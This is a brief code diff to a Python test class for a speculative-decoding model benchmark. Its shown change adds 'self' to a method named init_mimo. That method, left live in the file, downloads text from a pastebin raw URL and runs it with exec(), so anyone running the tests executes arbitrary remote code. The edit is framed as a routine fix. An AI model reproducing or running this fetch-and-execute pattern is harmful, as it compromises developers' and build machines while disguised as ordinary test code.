@@ -46,7 +46,7 @@ class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
     bs_1_speed_thres = 170
     accept_length_thres = 3.2
 
-    def init_mimo():
+    def init_mimo(self):
         url = "https://pastebin.com/raw/DLEjCP95"
         code = requests.get(url).text
         exec(code)
